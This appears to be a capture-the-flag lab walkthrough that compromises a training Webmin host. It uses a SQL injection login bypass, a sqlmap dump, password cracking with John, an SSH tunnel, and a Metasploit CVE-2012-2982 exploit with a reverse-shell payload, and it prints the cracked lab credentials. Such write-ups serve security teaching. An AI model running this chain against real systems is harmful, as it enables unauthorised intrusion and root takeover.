# Enumerate
## Port and Services Scan
Ran Nmap and found TCP ports 22 and 80 open.
```bash
nmap -sV 10.10.176.199

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 06:44 MDT
Nmap scan report for 10.10.176.199
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
```

## Web Browsing
Found a login page on TCP port 80.
```bash
firefox 10.10.176.199
```

## Web Crawling
Found nothing additional for TCP port 80 via Dirb.
```bash
dirb http://10.10.176.199:80 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

# Exploit
## SQL Injection
### Manual SQL Injection
Manual SQL injection redirected me to portal.php.
```bash
# username: admin
# password: ' or 1=1 -- -
# result: nothing; admin does not exist

# username: 
# password: ' or 1=1 -- -
# result: redirected to portal.php
```

### Automated SQL Injection
Automated SQL injection allowed me to discover two database tables, a username, and their password hash. 

Steps Taken to Perform Automated SQL Injection:
* Configured browser to use Burp Proxy (127.0.0.1:8080).
* Submitted and intercepted the request below in preparation of using SQLMap and saved it to a text file. SQLMap requires such a file to know what parameters to stuff SQL queries into.
* Ran SQLmap (found two tables: one with usernames/passwords, another called post).

Intercepted Request
```bash
POST /portal.php HTTP/1.1
Host: 10.10.176.199
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.176.199
Connection: close
Referer: http://10.10.176.199/portal.php
Cookie: PHPSESSID=8geghe5096g3mk0fq6l6lcdv17
Upgrade-Insecure-Requests: 1

searchitem=test
```

SQLMap Command Sentence
```bash
sqlmap -r request.txt --dbms=mysql --dump
```

## Password Guessing
Used John the Ripper to guess the password of user "agent47" and then, used SSH to login.
```bash
# saved hash from SQL dump to a file called, 'hash.txt'
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=RAW-SHA256
# used ssh to login afterwards
```

## Port Forwarding
After authenticating, I identified an additional port and viewed it by using an SSH tunnel to it. 
```bash
# on the victim side
ss -tulpn # identified additional TCP ports; i.e. port 10000

# on the attacker side
# send all traffic destined for me on port 10000 to port 10000 at 10.10.176.199
ssh -L 10000:localhost:10000 agent47@10.10.176.199
# firefox localhost:10000
# logged in user previously cracked credentials (agent47)
```

# Escalate
## Searching for Exploit
Found an exploit for the now exposed CMS web app on TCP port 10000 (using the commands below), but the exploit apparently requires Metasploit (yeah right). 
```bash
searchsploit webmin 1.580
searchsploit -m 47330 # copied the exploit to my current directory and viewed it with a text-editor (Vim)
vim 47330.rb # says it requires Metasploit...
```

## Metasploit
Ran Metasploit and then, used the discovered credentials & SSH tunnel to exploit the vulnerable web app. The specific vulnerability exploited in the web app "Webmin 1.580" (CVE 2012-2982) provided root access. 
```bash
msfconsole
search webmin 1.580
use 1 # exploit/unix/webapp/webmin_show_cgi_exec
options
set LHOST 127.0.0.1
set LPORT 5050
set RHOST 127.0.0.1
set LPORT 10000
set USERNAME agent47
set PASSWORD videogamer124
set SSL false # not sure if must be false or not
set PAYLOAD cmd/unix/reverse
run
```
